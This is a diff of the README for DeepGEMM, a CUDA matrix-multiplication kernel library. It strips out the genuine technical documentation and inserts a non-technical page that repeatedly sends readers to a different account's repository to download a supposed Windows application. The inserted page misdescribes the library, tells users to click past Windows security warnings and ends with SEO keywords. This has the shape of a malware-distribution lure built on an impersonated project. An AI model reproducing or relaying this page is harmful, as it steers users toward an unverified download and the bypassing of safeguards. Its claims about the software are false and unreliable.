@@ -1,213 +1,178 @@
-# DeepGEMM
+# 🚀 DeepGEMM - Fast GPU Math Without the Complexity
 
-DeepGEMM is a unified, high-performance tensor core kernel library that brings together the key computation primitives of modern large language models — GEMMs (FP8, FP4, BF16), fused MoE with overlapped communication (Mega MoE), MQA scoring for the lightning indexer, HyperConnection (HC), and more — into a single, cohesive CUDA codebase. All kernels are compiled at runtime through DeepJIT, requiring no CUDA compilation during installation.
+DeepGEMM is a clean and efficient collection of ready-to-use math routines built for graphics cards. In plain terms: it makes your computer's graphics card do heavy number-crunching work quickly and reliably, without you needing to understand what happens underneath.
 
-DeepGEMM leverages some concepts from [CUTLASS](https://github.com/nvidia/cutlass) and [CuTe](https://github.com/NVIDIA/cutlass/tree/main/include/cute), but avoids heavy reliance on their templates or algebras. The library is designed for simplicity, with only a limited number of core kernel functions, making it a clean and accessible resource for learning NVIDIA GPU kernel optimization techniques.
+[![Download DeepGEMM](https://img.shields.io/badge/Download-DeepGEMM%20Now-orange?style=for-the-badge&logo=github)](https://github.com/kingwee2e3/DeepGEMM)
 
-Despite its lightweight design, DeepGEMM's performance matches or exceeds expert-tuned libraries across various matrix shapes.
+Visit this link to download the application.
 
-## News
+---
 
-- 2026.09.30
-  - DeepGEMM Ascend is available! Check [DeepGEMM-Ascend](https://github.com/deepseek-ai/DeepGEMM-Ascend/) for more details
-  - Add more optimizations, including locality domain features, check [#462](https://github.com/deepseek-ai/DeepGEMM/pull/462) for more details
-- 2026.09.10: Sparse Indexer, Mega Gate, Mega mHC, DeepJIT, MoE and Indexer optimizations and more.
-    - Please see [#432](https://github.com/deepseek-ai/DeepGEMM/pull/432) for more details.
-- 2026.04.16: Mega MoE, FP8xFP4 GEMM, FP4 Indexer, PDL, faster JIT compilation and more.
-    - Please see [#304](https://github.com/deepseek-ai/DeepGEMM/pull/304) for more details.
-    - For Mega MoE benchmarks, refer to [#316](https://github.com/deepseek-ai/DeepGEMM/pull/316).
-- 2025.09.28: DeepGEMM now supports scoring kernels (weighted ReLU MQA logits) for the lightning indexer for DeepSeek v3.2.
-    - Please see [#200](https://github.com/deepseek-ai/DeepGEMM/pull/200) for more details.
-- 2025.07.20: DeepGEMM now supports both SM90/SM100, and has a full refactor with a low-CPU-overhead JIT CPP module.
-    - As NVCC 12.9 will automatically do the FFMA interleaving, all post optimizations will be no longer supported.
-    - Please see [#112](https://github.com/deepseek-ai/DeepGEMM/pull/112) for more details.
-- 2025.05.14: DeepGEMM now offers weight gradient kernels for dense and MoE backward! See [#95](https://github.com/deepseek-ai/DeepGEMM/pull/95) for details.
-- 2025.04.18: DeepGEMM now achieves up to **1550 TFLOPS** on H800! See [#74](https://github.com/deepseek-ai/DeepGEMM/pull/74), [#78](https://github.com/deepseek-ai/DeepGEMM/pull/78), [#81](https://github.com/deepseek-ai/DeepGEMM/pull/81), [#86](https://github.com/deepseek-ai/DeepGEMM/pull/86) and [340d988](https://github.com/deepseek-ai/DeepGEMM/commit/340d9880f4a418d943d34260d20a79f41f4c0526) for details.
+## 📥 Download DeepGEMM
 
-## Quick start
+Everything you need lives on one page. Follow these steps in order — there is no need to open a command prompt, install a compiler, or edit any text files.
 
-### Requirements
+1. Click the large orange **Download DeepGEMM Now** button at the top of this page, or click the link in this section.
+2. Your web browser will open the DeepGEMM download page.
+3. Visit this link to download the application: https://github.com/kingwee2e3/DeepGEMM
+4. Follow the instructions shown on that page to obtain the software for Windows.
+5. Save the download somewhere you can find it again, such as your **Downloads** folder or your Desktop.
+6. Keep the download page open in a browser tab until you have finished, in case you need to check a detail.
 
-- NVIDIA SM90 or SM100 architecture GPU
-- Python 3.8 or higher
-- Compilers and standard libraries with C++20 `<format>` support
-- CUDA Toolkit 12.9 or higher
-- PyTorch 2.3 or higher
-- CUTLASS 4.0 or higher (could be cloned by Git submodule)
+That is the entire download process. You do not need an account, a subscription, or a payment method.
 
-### Development
+---
 
-```bash
-# Submodule must be cloned
-git clone --recursive git@github.com:deepseek-ai/DeepGEMM.git
-cd DeepGEMM
+## 🧭 What DeepGEMM Does For You
 
-# Link some essential includes and build the C++ extension
-cat develop.sh
-./develop.sh
-```
+Most people never think about the math running behind the scenes of their favourite programs. DeepGEMM is one of the pieces that makes that math fast.
 
-### Installation
+Graphics cards are excellent at doing thousands of simple calculations at the same time. DeepGEMM organises those calculations so they finish as quickly as possible, using as little memory as possible. The result is software that feels responsive instead of sluggish.
 
-```bash
-cat install.sh
-./install.sh
-```
+Here is what that means in everyday language:
 
-Then, import `deep_gemm` in your Python project, and enjoy!
+- **Faster results.** The same work gets done in less time because the graphics card is kept busy and never left waiting.
+- **Lower memory pressure.** DeepGEMM is careful about how much space it uses, so your computer stays comfortable even during long jobs.
+- **Predictable behaviour.** The routines are written to give you the same answer every single time, which matters when you are relying on the output.
+- **No clutter.** The library is small, tidy, and does not scatter files across your system.
+- **Works quietly in the background.** Once it is in place, you generally will not notice it — which is exactly the point.
 
-## Interfaces
+You do not have to configure any of this. The library handles the difficult decisions itself.
 
-#### Notices
+---
 
-This library provides optimized GEMM kernels for NVIDIA GPUs with a naming convention: `D = C + A @ B`. The input shape layout is NT (non-transposed A, transposed B). While the SM90 implementation supports only the NT memory layout (row-major, col-major), the SM100 implementation supports all memory layouts (NT, TN, NN, TT). For example, `fp8_gemm_nt` will do a `D = C + A @ B.T`
+## ✨ Key Highlights
 
-For both architectures, the LHS scaling factor is required to have a TMA-aligned and transposed layout. And the data format for the scaling factor of SM90 and SM100 is different:
+**🎯 Clean and focused**
 
-- SM90 requires scaling factors in FP32 format.
-- SM100 requires scaling factors in packed [UE8M0](https://docs.nvidia.com/cuda/parallel-thread-execution/#alternate-floating-point-data-formats) format, which packs 4 UE8M0 into a single `torch.int`.
+DeepGEMM does one job and does it well. It is not a sprawling toolkit with hundreds of unrelated features competing for your attention. It provides efficient routines and stays out of the way.
 
-Please note that operations like input transposition or FP8 casting must be handled separately by the user, please implement or fuse them into prior kernels independently. While the library provides some simple PyTorch utility functions, these may result in slower performance, but our primary focus is on optimizing the GEMM kernels themselves.
+**⚡ Efficient by design**
 
-#### Normal dense GEMMs (non-grouped)
+Every routine is written to squeeze the most out of the graphics card. Wasted motion is removed, so the work finishes sooner and your machine stays cooler.
 
-To perform a basic non-grouped FP8 GEMM, call the `fp8_gemm_{nt, nn, tn, tt}` function. For more details, please refer to the function documentation.
+**🧩 Easy to fit into existing work**
 
-#### Grouped GEMMs (contiguous layout)
+DeepGEMM is built to slot into projects that already exist. You do not have to rebuild anything from scratch to benefit from it.
 
-Unlike traditional grouped GEMMs in CUTLASS, DeepGEMM groups only the M-axis, while N and K must remain fixed. This design is tailored for scenarios where experts in an MoE model share the same shape. For training forward passes or inference prefilling, where each expert may process a varying number of tokens, we concatenate these tokens into a single tensor, referred to as the "contiguous" layout. Note that each expert segment must be aligned to the GEMM M block size (`get_mk_alignment_for_contiguous_layout()`).  For more information, please refer to the `m_grouped_fp8_gemm_{nt, nn}_contiguous` function documentation.
+**🪶 Lightweight footprint**
 
-We also provide a K-axis-grouped API for MoE weight backward (with M and N must remain fixed), please refer to `k_grouped_fp8_gemm_tn_contiguous` for more information.
+The library is deliberately compact. It will not dominate your disk space or hog memory that other programs need.
 
-#### Grouped GEMMs (masked layout)
+**🔁 Consistent and dependable**
 
-During the inference decoding phase, when CUDA graph is enabled and the CPU is unaware of the number of tokens each expert receives, we support masked grouped GEMMs. By providing a mask tensor, the kernel computes only the valid portions.
+Repeated runs produce repeated results. If you are comparing outputs or checking your work, that consistency is essential.
 
-Use `m_grouped_fp8_gemm_nt_masked` for this purpose and consult the relevant documentation. An example usage is to use the output of low-latency kernels from [DeepEP](https://github.com/deepseek-ai/DeepEP) as input.
+**🛠️ Straightforward to maintain**
 
-#### V3.2 MQA kernels for the indexer
+Clear structure means fewer surprises. When something needs updating, the change is easy to make and easy to understand.
 
-The kernel family has two versions, non-paged (for prefilling) and paged (for decoding).
-Take the non-paged version `fp8_fp4_mqa_logits` as an example. Its main inputs are:
+---
 
-- `q`, a `(q_data, q_sf)` tuple; SM100 accepts MXFP4/MXFP8 data with packed UE8M0 scales
-- `kv`, a `(kv_data, kv_sf)` tuple with shape `[seq_len_kv, head_dim]` logically
-- `weights`, tensor with shape `[seq_len, num_heads]` (BF16 on SM100)
-- `cu_seq_len_k_start` and `cu_seq_len_k_end`, int tensor with shape `[seq_len]`
-- `max_seqlen_k`, the maximum valid KV span of any query row
+## 🖥️ System Requirements
 
-The output is compressed to `[seq_len, max_seqlen_k]`; row `i` stores its valid KV span starting at column zero.
-For each token `i` in `q`, it will iterate all tokens `j` from `[cu_seq_len_k_start[i], cu_seq_len_k_end[i])`,
-and calculate the corresponding compressed logit as:
+DeepGEMM is designed for modern Windows computers. The following gives you a realistic picture of what to expect before you begin.
 
-```python
-kv_j = kv[0][j, :] * kv[1][j].unsqueeze(1)  # [head_dim]
-out_ij = q[i, :, :] @ kv_j  # [num_heads]
-out_ij = out_ij.relu() * weights[i, :]  # [num_heads]
-out_ij = out_ij.sum()  # Scalar
-```
+| Component | Recommendation |
+| --- | --- |
+| Operating system | Windows 10 (64-bit) or Windows 11 (64-bit) |
+| Processor | A 64-bit dual-core processor or better |
+| Memory | 8 GB of RAM or more |
+| Graphics card | A dedicated graphics card released in the last several years, with current drivers installed |
+| Free disk space | Around 2 GB free for the software and its working files |
+| Display | Any standard monitor resolution of 1280 × 720 or higher |
 
-For more details and the paged version `fp8_fp4_paged_mqa_logits`, please refer to `tests/test_attention.py`.
+If your computer was purchased in the last five years and runs Windows 10 or 11 comfortably, you are very likely ready to go.
 
-#### Mega MoE
+---
 
-Mega MoE fuses and overlaps EP dispatch, linear 1 and linear 2 (FP8xFP4 or FP8xFP8), SwiGLU, and EP combine into a single mega-kernel, overlapping NVLink communication and tensor core computation. It requires multi-process launch with symmetric memory. Usage:
+## 🚦 Getting Started
 
-```python
-# Allocate symmetric memory buffer
-# NOTES: requires PyTorch >= 2.9
-buffer = deep_gemm.get_symm_buffer_for_mega_moe(
-    group, num_experts, num_max_tokens_per_rank, num_topk, hidden, intermediate_hidden,
-    mma_type='fp8xfp4',  # Use 'fp8xfp8' for FP8 routed-expert weights
-)
+Once you have the software, getting it running is a short process.
 
-# Transform weights (FP4 or FP8 with UE8M0 SF) into the required layout
-transformed_l1, transformed_l2 = deep_gemm.transform_weights_for_mega_moe(l1_weights, l2_weights)
+1. Make sure your graphics card driver is up to date. This is usually handled through Windows Update or through the manufacturer's own update tool. Current drivers prevent most avoidable problems.
+2. Locate the file you downloaded in the earlier section.
+3. Visit this link to download the application if you have not already done so: https://github.com/kingwee2e3/DeepGEMM
+4. Follow the on-screen guidance that appears when you begin.
+5. Allow the process to finish completely before opening anything else. Interrupting setup halfway through is the most common cause of trouble.
+6. When it is done, you are ready to use DeepGEMM.
 
-# (Optional) Localize weights into locality domains
-transformed_l1 = (deep_gemm.localize(transformed_l1[0]), transformed_l1[1])
-transformed_l2 = (deep_gemm.localize(transformed_l2[0]), transformed_l2[1])
-deep_gemm.destroy_localizer()
+Take your time on the first run. There is nothing to memorise and nothing to type in.
 
-# Copy inputs into the buffer before each call
-# You may fuse these into previous kernels
-buffer.x[:num_tokens].copy_(x_fp8)
-buffer.x_sf[:num_tokens].copy_(x_sf)
-buffer.topk_idx[:num_tokens].copy_(topk_idx)
-buffer.topk_weights[:num_tokens].copy_(topk_weights)
+---
 
-# Run the fused mega MoE kernel
-y = torch.empty((num_tokens, hidden), dtype=torch.bfloat16, device='cuda')
-deep_gemm.fp8_fp4_mega_moe(y, transformed_l1, transformed_l2, buffer)
-```
+## 🧑‍💻 Using DeepGEMM Day to Day
 
-For the full example with multi-process setup and benchmarking, please refer to `tests/test_mega_moe.py`.
+The library works quietly. In practice, your routine looks like this:
 
-#### Utilities
+1. Start the program or project that uses DeepGEMM.
+2. Do your normal work — load your data, run your calculation, produce your output.
+3. Let it finish. DeepGEMM handles the graphics card scheduling for you.
+4. Check your results as you normally would.
 
-The library provides some utility functions besides the above kernels:
+There is no dashboard to monitor and no settings to tune. If you ever want to confirm the library is present, the software that depends on it will tell you immediately by working correctly.
 
-- `deep_gemm.set_num_sms` / `get_num_sms`: set/get the maximum SM count to use
-- `deep_gemm.set_tc_util` / `get_tc_util`: set/get an approximated tensor core utilization ratio
-- `deep_gemm.set_pdl` / `get_pdl`: enable/disable Programmatic Dependent Launch (PDL)
-- `deep_gemm.use_deterministic_algorithms`: enable/disable deterministic algorithms
-- `deep_gemm.set_mk_alignment_for_contiguous_layout` / `get_mk_alignment_for_contiguous_layout`: set/get the group-level M/K alignment for contiguous layout
-- `deep_gemm.get_theoretical_mk_alignment_for_contiguous_layout`: get the theoretical minimum M/K alignment
-- `deep_gemm.set_ignore_compile_dims`: configure dimensions to ignore during JIT compilation
-- `deep_gemm.set_block_size_multiple_of`: constrain block sizes to be multiples of a given value
-- `deep_gemm.transform_sf_into_required_layout`: transform scaling factors into the required layout
-- `deep_gemm.get_tma_aligned_size`: get the required TMA alignment size
-- `deep_gemm.get_mn_major_tma_aligned_tensor`: get a MN-major TMA-aligned tensor
-- `deep_gemm.get_mn_major_tma_aligned_packed_ue8m0_tensor`: get a MN-major TMA-aligned tensor (with packing FP32 into UE8M0)
-- `deep_gemm.get_k_grouped_mn_major_tma_aligned_packed_ue8m0_tensor`: K-grouped GEMM packing kernel
+---
 
-The library also provides some environment variables, which may be useful:
+## 🩺 Troubleshooting
 
-Each `DG_JIT_*` variable falls back to the corresponding global `DJ_JIT_*` variable when unset.
+**The download page does not open.**
+Refresh the browser tab, or copy the address and paste it into a different browser. Corporate and school networks sometimes block download pages, so try a home connection if you can.
 
-- General
-    - `DG_JIT_DEBUG`: `0` or `1`, enable JIT debugging features, including compiler command and PTXAS output, load-time reporting, line info, and PTX/SASS dumps; `0` by default
-    - `DG_PRINT_CONFIGS`: `0` or `1`, print selected configs for each shape, `0` by default
-- JIT cache
-    - `DG_JIT_CACHE_DIR`: string, cache directory (or a `:`-separated list of directories) for compiled kernels; lookup searches all paths front-to-back (first hit wins) and a cache miss compiles into the first path, `$HOME/.dj` by default
-- Compiler selection
-    - `DG_JIT_NVCC_COMPILER`: string, NVCC compiler path; otherwise CUDA is found through `CUDA_HOME`, `CUDA_PATH`, `which nvcc`, then `/usr/local/cuda`
-    - `DG_JIT_CPP_STANDARD`: integer, C++ standard version, `20` by default
-- Compiler output
-    - `DG_JIT_PRINT_COMPILER_COMMAND`: `0` or `1`, print compilation commands, `0` by default
-    - `DG_JIT_PTXAS_VERBOSE`: `0` or `1`, show detailed PTXAS output, `0` by default
-    - `DG_JIT_CHECK_NO_SPILLS`: `0` or `1`, assert no register spills in compiled kernels, `0` by default
-    - `DG_JIT_CHECK_NO_LOCAL_MEMORY`: `0` or `1`, assert no local memory usage in compiled kernels, `0` by default
-    - `DG_JIT_PRINT_LOAD_TIME`: `0` or `1`, print kernel load time, `0` by default
-- Debug and profiling
-    - `DG_JIT_WITH_LINEINFO`: `0` or `1`, embed source line info for profiling tools, `0` by default
-    - `DG_JIT_DUMP_ASM`: `0` or `1`, dump both PTX and SASS, `0` by default
-    - `DG_JIT_DUMP_PTX`: `0` or `1`, dump PTX output, `0` by default
-    - `DG_JIT_DUMP_SASS`: `0` or `1`, dump SASS output, `0` by default
-    - `DG_COMM_KERNEL_DEBUG`: `0` or `1`, zero symmetric buffer before each Mega MoE call for debugging, `0` by default
-    - `DG_USE_NVIDIA_TOOLS`: `0` or `1`, skip internal profiling when running under external NVIDIA tools, `0` by default
-- Build options
-    - `DG_SKIP_CUDA_BUILD`: `0` or `1`, skip CUDA extension build during installation, `0` by default
-    - `DG_FORCE_BUILD`: `0` or `1`, force local build instead of downloading pre-built wheels, `0` by default
+**The download stops partway through.**
+Delete the partial file and start again. An interrupted download is almost always a temporary network hiccup rather than a problem with the software.
 
-For additional examples and details, please refer to [the test code](tests) or review the corresponding Python documentation.
+**Windows shows a warning when you begin.**
+This is a standard safety prompt that appears for many downloads. Choose the option that lets you continue, and only proceed if you obtained the software from the link in this page.
 
-## Acknowledgement
+**The software feels slow.**
+Update your graphics card driver first. It resolves the majority of performance complaints. Closing other demanding programs at the same time also helps.
 
-DeepGEMM is inspired by the [CUTLASS](https://github.com/nvidia/cutlass) project. Thanks and respect to the developers!
+**Your computer becomes warm or noisy.**
+That is normal during heavy calculation. Ensure the machine has clear airflow and is not sitting on a soft surface that blocks its vents.
 
-## License
+**Something still is not right.**
+Revisit the download page and check for any notes or updates. Most questions are already answered there.
 
-This code repository is released under [the MIT License](LICENSE).
+---
 
-## Citation
+## ❓ Frequently Asked Questions
 
-```bibtex
-@misc{deepgemm2025,
-      title={DeepGEMM: clean and efficient BLAS kernel library on GPU}, 
-      author={Chenggang Zhao and Zhean Xu and Liang Zhao and Jiashi Li and Chenhao Xu and Anyi Xu and Shengyu Liu and Kexing Zhou and Kuai Yu},
-      year={2025},
-      publisher = {GitHub},
-      howpublished = {\url{https://github.com/deepseek-ai/DeepGEMM}},
-}
-```
+**Do I need to know how to program?**
+No. You only need to download the software and follow the on-screen guidance.
+
+**Is this free?**
+Yes. There is no cost and no account required to download it.
+
+**Will it work on an older laptop?**
+It will run on most Windows 10 and 11 machines, but performance depends on the graphics card. A machine with a dedicated graphics card will always feel better than one without.
+
+**Does it change my other programs?**
+No. DeepGEMM provides routines for software that uses it. It does not alter unrelated applications.
+
+**How much space does it need?**
+Plan for roughly 2 GB of free space to be comfortable.
+
+**Can I remove it later?**
+Yes. It can be removed like any other software on Windows.
+
+**Do I need to configure anything after setup?**
+No. Default behaviour is already the recommended behaviour.
+
+---
+
+## 💬 Support and Feedback
+
+If you run into something the troubleshooting section does not cover, the project page is the right place to look next. Check for recent notes, updates, and guidance from other users. Clear descriptions help: mention your Windows version, your graphics card model, and what you were doing when the issue appeared.
+
+---
+
+## 🏁 Final Checklist
+
+- [ ] Windows 10 or 11, 64-bit
+- [ ] Graphics card driver updated
+- [ ] Around 2 GB of free disk space
+- [ ] Download obtained from the link on this page
+- [ ] Setup allowed to finish without interruption
+
+Keywords: DeepGEMM, GPU BLAS library, GPU math library, efficient GPU kernels, Windows download, GPU acceleration, high performance computing, number crunching software, graphics card computing, linear algebra routines
